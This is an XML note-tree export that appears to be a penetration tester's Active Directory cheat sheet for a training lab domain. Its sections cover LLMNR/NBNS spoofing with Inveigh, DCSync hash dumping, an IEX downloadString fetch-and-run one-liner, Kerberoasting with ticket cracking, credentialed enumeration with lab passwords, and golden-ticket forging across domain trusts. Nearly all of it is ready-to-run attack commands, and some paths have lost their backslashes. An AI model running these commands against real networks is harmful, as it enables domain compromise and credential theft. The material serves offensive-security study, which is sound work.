      <rich_text family="monospace" background="#000000000000">Import-Module</rich_text>
      <rich_text background="#000000000000"> PowerShell cmd-let to import the Windows-based tool </rich_text>
      <rich_text family="monospace" background="#000000000000">Inveigh.ps1</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">(Get-Command Invoke-Inveigh).Parameters</rich_text>
      <rich_text background="#000000000000">

Used to output many of the options &amp; functionality available with </rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-Inveigh</rich_text>
      <rich_text background="#000000000000">. Peformed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</rich_text>
      <rich_text background="#000000000000">

Starts </rich_text>
      <rich_text family="monospace" background="#000000000000">Inveigh</rich_text>
      <rich_text background="#000000000000"> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Inveigh.exe</rich_text>
      <rich_text background="#000000000000">

Starts the </rich_text>
      <rich_text family="monospace" background="#000000000000">C#</rich_text>
      <rich_text background="#000000000000"> implementation of </rich_text>
      <rich_text family="monospace" background="#000000000000">Inveigh</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$regkey = "HKLM:SYSTEMCurrentControlSetservicesNetBTParametersInterfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}</rich_text>
      <rich_text background="#000000000000">

PowerShell script used to disable NBT-NS on a Windows host.</rich_text>
    </node>
    <node unique_id="54" master_id="0" name="DCSync" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670982832">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to view the group membership of a specific user (</rich_text>
      <rich_text family="monospace" background="#000000000000">adunn)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain. Performed from a Windows

</rich_text>
      <rich_text family="monospace" background="#000000000000">$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</rich_text>
      <rich_text background="#000000000000">

Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool </rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ObjectAcl</rich_text>
      <rich_text background="#000000000000"> to check a specific user's replication rights. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</rich_text>
      <rich_text background="#000000000000">

Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (</rich_text>
      <rich_text family="monospace" background="#000000000000">172.16.5.5)</rich_text>
      <rich_text background="#000000000000"> save the extracted hashes to an file (</rich_text>
      <rich_text family="monospace" background="#000000000000">inlanefreight_hashes)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHTadministrator</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Mimikatz</rich_text>
      <rich_text background="#000000000000"> to perform a </rich_text>
      <rich_text family="monospace" background="#000000000000">dcsync</rich_text>
      <rich_text background="#000000000000"> attack from a Windows-based host.</rich_text>
    </node>
    <node unique_id="55" master_id="0" name="Transfering Files" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960170">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo python3 -m http.server 8001</rich_text>
      <rich_text background="#000000000000">

Starts a python web server for quick hosting of files. Performed from a Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"</rich_text>
      <rich_text background="#000000000000">

PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</rich_text>
      <rich_text background="#000000000000">

Starts a impacket </rich_text>
      <rich_text family="monospace" background="#000000000000">SMB</rich_text>
      <rich_text background="#000000000000"> server for quick hosting of a file. Performed from a Windows-based host.</rich_text>
    </node>
    <node unique_id="56" master_id="0" name="Kerberoasting" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960176">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo python3 -m pip install .</rich_text>
      <rich_text background="#000000000000">

Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py -h</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to display the options and functionality of </rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to get a list of </rich_text>
      <rich_text family="monospace" background="#000000000000">SPNs</rich_text>
      <rich_text background="#000000000000"> on the target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to download/request (</rich_text>
      <rich_text family="monospace" background="#000000000000">-request)</rich_text>
      <rich_text background="#000000000000"> TGS tickets for offline processing from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to download/request (</rich_text>
      <rich_text family="monospace" background="#000000000000">-request-user)</rich_text>
      <rich_text background="#000000000000"> TGS ticket for a specific user account (</rich_text>
      <rich_text family="monospace" background="#000000000000">sqldev)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (</rich_text>
      <rich_text family="monospace" background="#000000000000">-outputfile sqldev_tgs)</rich_text>
      <rich_text background="#000000000000">-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</rich_text>
      <rich_text background="#000000000000">

Attempts to crack the Kerberos (</rich_text>
      <rich_text family="monospace" background="#000000000000">-m 13100)</rich_text>
      <rich_text background="#000000000000"> hash (</rich_text>
      <rich_text family="monospace" background="#000000000000">sqldev_tgs)</rich_text>
      <rich_text background="#000000000000"> </rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat</rich_text>
      <rich_text background="#000000000000"> and a wordlist (</rich_text>
      <rich_text family="monospace" background="#000000000000">rockyou.txt)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">setspn.exe -Q */*</rich_text>
      <rich_text background="#000000000000">

Used to enumerate </rich_text>
      <rich_text family="monospace" background="#000000000000">SPNs</rich_text>
      <rich_text background="#000000000000"> in a target Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"</rich_text>
      <rich_text background="#000000000000">

PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</rich_text>
      <rich_text background="#000000000000">

Used to download/request all TGS tickets from a WIndows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mimikatz # base64 /out:true</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">Mimikatz</rich_text>
      <rich_text background="#000000000000"> command that ensures TGS tickets are extracted in </rich_text>
      <rich_text family="monospace" background="#000000000000">base64</rich_text>
      <rich_text background="#000000000000"> format from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">kerberos::list /export</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">Mimikatz</rich_text>
      <rich_text background="#000000000000"> command used to extract the TGS tickets from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">echo "&lt;base64 blob&gt;" | tr -d \n</rich_text>
      <rich_text background="#000000000000">

Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cat encoded_file | base64 -d &gt; sqldev.kirbi</rich_text>
      <rich_text background="#000000000000">

Used to output a file (</rich_text>
      <rich_text family="monospace" background="#000000000000">encoded_file)</rich_text>
      <rich_text background="#000000000000"> a .kirbi file in base64 (</rich_text>
      <rich_text family="monospace" background="#000000000000">base64 -d &gt; sqldev.kirbi)</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python2.7 kirbi2john.py sqldev.kirbi</rich_text>
      <rich_text background="#000000000000">

Used to extract the </rich_text>
      <rich_text family="monospace" background="#000000000000">Kerberos ticket</rich_text>
      <rich_text background="#000000000000">. This also creates a file called </rich_text>
      <rich_text family="monospace" background="#000000000000">crack_file</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sed 's/$krb5tgs$(.*):(.*)/$krb5tgs$23$*1*$2/' crack_file &gt; sqldev_tgs_hashcat</rich_text>
      <rich_text background="#000000000000">

Used to modify the </rich_text>
      <rich_text family="monospace" background="#000000000000">crack_file</rich_text>
      <rich_text background="#000000000000"> for </rich_text>
      <rich_text family="monospace" background="#000000000000">Hashcat</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cat sqldev_tgs_hashcat</rich_text>
      <rich_text background="#000000000000">

Used to view the prepared hash from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</rich_text>
      <rich_text background="#000000000000">

Used to crack the prepared Kerberos ticket hash (</rich_text>
      <rich_text family="monospace" background="#000000000000">sqldev_tgs_hashcat)</rich_text>
      <rich_text background="#000000000000"> a wordlist (</rich_text>
      <rich_text family="monospace" background="#000000000000">rockyou.txt)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module .PowerView.ps1 Get-DomainUser * -spn | select samaccountname</rich_text>
      <rich_text background="#000000000000">

Uses PowerView tool to extract </rich_text>
      <rich_text family="monospace" background="#000000000000">TGS Tickets</rich_text>
      <rich_text background="#000000000000"> . Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for </rich_text>
      <rich_text family="monospace" background="#000000000000">Hashcat</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .ilfreight_tgs.csv -NoTypeInformation</rich_text>
      <rich_text background="#000000000000">

Exports all TGS tickets to a </rich_text>
      <rich_text family="monospace" background="#000000000000">.CSV</rich_text>
      <rich_text background="#000000000000"> file (</rich_text>
      <rich_text family="monospace" background="#000000000000">ilfreight_tgs.csv)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">cat .ilfreight_tgs.csv</rich_text>
      <rich_text background="#000000000000">

Used to view the contents of the .csv file from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe</rich_text>
      <rich_text background="#000000000000">

Used to view the options and functionality possible with the tool </rich_text>
      <rich_text family="monospace" background="#000000000000">Rubeus</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe kerberoast /stats</rich_text>
      <rich_text background="#000000000000">

Used to check the kerberoast stats (</rich_text>
      <rich_text family="monospace" background="#000000000000">/stats)</rich_text>
      <rich_text background="#000000000000"> the target Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</rich_text>
      <rich_text background="#000000000000">

Used to request/download TGS tickets for accounts with the </rich_text>
      <rich_text family="monospace" background="#000000000000">admin</rich_text>
      <rich_text background="#000000000000"> count set to </rich_text>
      <rich_text family="monospace" background="#000000000000">1</rich_text>
      <rich_text background="#000000000000"> then formats the output in an easy to view &amp; crack manner (</rich_text>
      <rich_text family="monospace" background="#000000000000">/nowrap)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe kerberoast /user:testspn /nowrap</rich_text>
      <rich_text background="#000000000000">

Used to request/download a TGS ticket for a specific user (</rich_text>
      <rich_text family="monospace" background="#000000000000">/user:testspn)</rich_text>
      <rich_text background="#000000000000"> formats the output in an easy to view &amp; crack manner (</rich_text>
      <rich_text family="monospace" background="#000000000000">/nowrap)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to check the </rich_text>
      <rich_text family="monospace" background="#000000000000">msDS-SupportedEncryptionType</rich_text>
      <rich_text background="#000000000000"> attribute associated with a specific user account (</rich_text>
      <rich_text family="monospace" background="#000000000000">testspn)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</rich_text>
      <rich_text background="#000000000000">

Used to attempt to crack the ticket hash using a wordlist (</rich_text>
      <rich_text family="monospace" background="#000000000000">rockyou.txt)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host .</rich_text>
    </node>
    <node unique_id="57" master_id="0" name="Credentialed Enumeration" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960182">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</rich_text>
      <rich_text background="#000000000000">

Connects to a Windows target using valid credentials. Performed from a Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</rich_text>
      <rich_text background="#000000000000">

Authenticates with a Windows target over </rich_text>
      <rich_text family="monospace" background="#000000000000">smb</rich_text>
      <rich_text background="#000000000000"> using valid credentials and attempts to discover more users (</rich_text>
      <rich_text family="monospace" background="#000000000000">--users)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</rich_text>
      <rich_text background="#000000000000">

Authenticates with a Windows target over </rich_text>
      <rich_text family="monospace" background="#000000000000">smb</rich_text>
      <rich_text background="#000000000000"> using valid credentials and attempts to discover groups (</rich_text>
      <rich_text family="monospace" background="#000000000000">--groups)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</rich_text>
      <rich_text background="#000000000000">

Authenticates with a Windows target over </rich_text>
      <rich_text family="monospace" background="#000000000000">smb</rich_text>
      <rich_text background="#000000000000"> using valid credentials and attempts to check for a list of logged on users (</rich_text>
      <rich_text family="monospace" background="#000000000000">--loggedon-users)</rich_text>
      <rich_text background="#000000000000"> the target Windows host. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</rich_text>
      <rich_text background="#000000000000">

Authenticates with a Windows target over </rich_text>
      <rich_text family="monospace" background="#000000000000">smb</rich_text>
      <rich_text background="#000000000000"> using valid credentials and attempts to discover any smb shares (</rich_text>
      <rich_text family="monospace" background="#000000000000">--shares)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</rich_text>
      <rich_text background="#000000000000">

Authenticates with a Windows target over </rich_text>
      <rich_text family="monospace" background="#000000000000">smb</rich_text>
      <rich_text background="#000000000000"> using valid credentials and utilizes the CrackMapExec module (</rich_text>
      <rich_text family="monospace" background="#000000000000">-M)spider_plus</rich_text>
      <rich_text background="#000000000000"> to go through each readable share (</rich_text>
      <rich_text family="monospace" background="#000000000000">Dev-share)</rich_text>
      <rich_text background="#000000000000"> list all readable files. The results are outputted in </rich_text>
      <rich_text family="monospace" background="#000000000000">JSON</rich_text>
      <rich_text background="#000000000000">. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</rich_text>
      <rich_text background="#000000000000">

Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (</rich_text>
      <rich_text family="monospace" background="#000000000000">-H)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</rich_text>
      <rich_text background="#000000000000">

Enumerates the target Windows domain using valid credentials and performs a recursive listing (</rich_text>
      <rich_text family="monospace" background="#000000000000">-R)</rich_text>
      <rich_text background="#000000000000"> the specified share (</rich_text>
      <rich_text family="monospace" background="#000000000000">SYSVOL)</rich_text>
      <rich_text background="#000000000000"> only outputs a list of directories (</rich_text>
      <rich_text family="monospace" background="#000000000000">--dir-only)</rich_text>
      <rich_text background="#000000000000"> the share. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient $&gt; queryuser 0x457</rich_text>
      <rich_text background="#000000000000">

Enumerates a target user account in a Windows domain using its relative identifier (</rich_text>
      <rich_text family="monospace" background="#000000000000">0x457)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient $&gt; enumdomusers</rich_text>
      <rich_text background="#000000000000">

Discovers user accounts in a target Windows domain and their associated relative identifiers (</rich_text>
      <rich_text family="monospace" background="#000000000000">rid)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to connect to the </rich_text>
      <rich_text family="monospace" background="#000000000000">CLI</rich_text>
      <rich_text background="#000000000000"> of a Windows target via the </rich_text>
      <rich_text family="monospace" background="#000000000000">ADMIN$</rich_text>
      <rich_text background="#000000000000"> administrative share with valid credentials. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to connect to the </rich_text>
      <rich_text family="monospace" background="#000000000000">CLI</rich_text>
      <rich_text background="#000000000000"> of a Windows target via </rich_text>
      <rich_text family="monospace" background="#000000000000">WMI</rich_text>
      <rich_text background="#000000000000"> with valid credentials. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">windapsearch.py -h</rich_text>
      <rich_text background="#000000000000">

Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreightwley -p Klmcargo2 --da</rich_text>
      <rich_text background="#000000000000">

Used to enumerate the domain admins group (</rich_text>
      <rich_text family="monospace" background="#000000000000">--da)</rich_text>
      <rich_text background="#000000000000"> a valid set of credentials on a target Windows domain. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreightwley -p Klmcargo2 -PU</rich_text>
      <rich_text background="#000000000000">

Used to perform a recursive search (</rich_text>
      <rich_text family="monospace" background="#000000000000">-PU)</rich_text>
      <rich_text background="#000000000000"> users with nested permissions using valid credentials. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</rich_text>
      <rich_text background="#000000000000">

Executes the python implementation of BloodHound (</rich_text>
      <rich_text family="monospace" background="#000000000000">bloodhound.py)</rich_text>
      <rich_text background="#000000000000"> valid credentials and specifies a name server (</rich_text>
      <rich_text family="monospace" background="#000000000000">-ns)</rich_text>
      <rich_text background="#000000000000"> target Windows domain (</rich_text>
      <rich_text family="monospace" background="#000000000000">inlanefreight.local)</rich_text>
      <rich_text background="#000000000000"> well as runs all checks (</rich_text>
      <rich_text family="monospace" background="#000000000000">-c all)</rich_text>
      <rich_text background="#000000000000"> Runs using valid credentials. Performed from a Linux-based host.</rich_text>
    </node>
    <node unique_id="58" master_id="0" name="Trust Relationships - Child &gt; Parent Trusts" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960188">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module activedirectory</rich_text>
      <rich_text background="#000000000000">

Used to import the </rich_text>
      <rich_text family="monospace" background="#000000000000">Active Directory</rich_text>
      <rich_text background="#000000000000"> module. Performed from a Windows
</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADTrust -Filter *</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainTrust</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainTrustMapping</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to perform a domain trust mapping from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</rich_text>
      <rich_text background="#000000000000">

PowerView tools used to enumerate users in a target child domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mimikatz # lsadump::dcsync /user:LOGISTICSkrbtgt</rich_text>
      <rich_text background="#000000000000">

Uses Mimikatz to obtain the </rich_text>
      <rich_text family="monospace" background="#000000000000">KRBTGT</rich_text>
      <rich_text background="#000000000000"> account's </rich_text>
      <rich_text family="monospace" background="#000000000000">NT Hash</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainSID</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to get the SID for a target child domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to obtain the </rich_text>
      <rich_text family="monospace" background="#000000000000">Enterprise Admins</rich_text>
      <rich_text background="#000000000000"> group's SID from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ls \academy-ea-dc01.inlanefreight.localc$</rich_text>
      <rich_text background="#000000000000">

Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Mimikatz</rich_text>
      <rich_text background="#000000000000"> to create a </rich_text>
      <rich_text family="monospace" background="#000000000000">Golden Ticket</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host .

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Rubeus</rich_text>
      <rich_text background="#000000000000"> to create a </rich_text>
      <rich_text family="monospace" background="#000000000000">Golden Ticket</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">mimikatz # lsadump::dcsync /user:INLANEFREIGHTlab_adm</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Mimikatz</rich_text>
      <rich_text background="#000000000000"> to perform a DCSync attack from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">secretsdump.py logistics.inlanefreight.local/lafi@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to perform a DCSync attack from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">lookupsid.py logistics.inlanefreight.local/lafi@172.16.5.240</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to perform a </rich_text>
      <rich_text family="monospace" background="#000000000000">SID Brute forcing</rich_text>
      <rich_text background="#000000000000"> attack from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">lookupsid.py logistics.inlanefreight.local/lafi@172.16.5.240 | grep "Domain SID"</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">lookupsid.py logistics.inlanefreight.local/lafi@172.16.5.5 | grep -B12 "Enterprise Admins"</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to retrieve the </rich_text>
      <rich_text family="monospace" background="#000000000000">SID</rich_text>
      <rich_text background="#000000000000"> of a target Windows domain and attach it to the Enterprise Admin group's </rich_text>
      <rich_text family="monospace" background="#000000000000">RID</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to create a </rich_text>
      <rich_text family="monospace" background="#000000000000">Golden Ticket</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">export KRB5CCNAME=hacker.ccache</rich_text>
      <rich_text background="#000000000000">

Used to set the </rich_text>
      <rich_text family="monospace" background="#000000000000">KRB5CCNAME Environment Variable</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@lafi-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.

</rich_text>
